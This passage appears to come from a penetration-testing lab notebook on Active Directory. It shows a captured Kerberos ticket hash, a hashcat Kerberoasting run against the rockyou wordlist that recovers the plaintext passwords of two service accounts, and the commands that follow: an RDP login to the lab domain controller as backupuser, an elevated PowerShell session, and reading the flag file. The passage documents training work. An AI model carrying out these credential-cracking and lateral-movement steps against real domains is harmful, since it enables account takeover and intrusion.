79B4B663005DD8C49D81A504AF631839828F0B814AAFFAABA4140C96197A3BF985A48DBE534CAF6B497D6751E299DF005E24A2228112FE825AFD1EDA10A43DA76165D9452280D1F1C0B4A60EAF58A2916B8855E6968AC74DC93DEA8A856865DFB7865EE0CD533E83F053EDA112A39B0E53B53ACA806AEC49BF3C0F98F488301FC5F6520D97055F67AB66069D67824B27B31BAC1862DA921BD33D1781EE457FE416420410053DB614B03989DF1F5C4D0ED9BAAED139AE541180614AB616C977E3ECBC0854F4342D34A8481411A2296E1EF8FA1188FD0CA54BC31999758DE9A7A3F3E218B7FAFBF827C6D9118DCB9E4C9A9D6C802407E1730387F36227E819E253BFE4CBF6BC9FFB0F4530533B3CF88A7A7D701D8E78D4DD12122D503ED424E4FF1D5402881D25C18C4DF1DF7484F7CFC2CB96850D52EB296EC9462BFB66AA4A0881F1A19A51A2B1D7CA2F28B81410CDE584A5934E39B4E7733198232B3A12978975099F85DB1EDEA6DD0900E4B31F55492D1C69D10F955133E933FB738FE34A3D8B15531A7D33C00BAECAAE336E29931FA1F06196793B4D2862A4395D71987484234765AD54FF07D2783F145BB3BE1C658A6E27A2046C95C86595B79C80D7161524F7E0


hashcat -m 13100 hashes.kerb.cap3 /usr/share/wordlists/rockyou.txt -r rule_cap2.txt --force
	...iss_service...
	...
	d5fac699909:Strawberry1
	...
	...backupuser...
	...
	d7161524f7e0:DonovanJadeKnight1
```

- RDP into DC via `backupuser:DonovanJadeKnight1`
```powershell
xfreerdp /cert-ignore /u:backupuser /d:corp.com /p:DonovanJadeKnight1 /v:192.168.160.70

powershell.exe
Start-Process powershell.exe -Verb runAs

Get-ChildItem -Path C:\Users\ -Filter flag.txt -Recurse -ErrorAction SilentlyContinue -Force

type C:\Users\Administrator\Desktop\flag.txt
```


# 23 - AD Lateral Movement

